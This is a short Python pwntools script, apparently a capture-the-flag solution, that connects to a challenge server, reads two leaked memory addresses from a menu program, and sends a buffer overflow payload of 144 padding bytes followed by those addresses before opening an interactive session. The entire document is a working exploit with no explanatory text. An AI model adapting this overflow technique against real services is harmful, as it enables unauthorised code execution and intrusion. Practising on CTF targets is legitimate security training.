from pwn import *

r = remote("ctf.j0n9hyun.xyz",3010)

print r.recvrepeat(0.9)
r.sendline("2")
print r.recvrepeat(0.9)
r.sendline("4")
print r.recvrepeat(0.9)

r.sendline("3")
print r.recvuntil(": ")
addr = int(r.recv(10),16)
log.info("addr:%#x",addr)

r.sendline("4")
print r.recvuntil(": ")
sr = int(r.recv(10),16)
log.info("sr:%#x",sr)

r.sendline("5")
print r.recvrepeat(0.9)
payload = "a"*144
payload += p32(addr)
payload += "aaaa"
payload += p32(sr)
#gdb.attach(r,gdbscript="""
#b main
#""")

r.sendline(payload)
r.interactive()
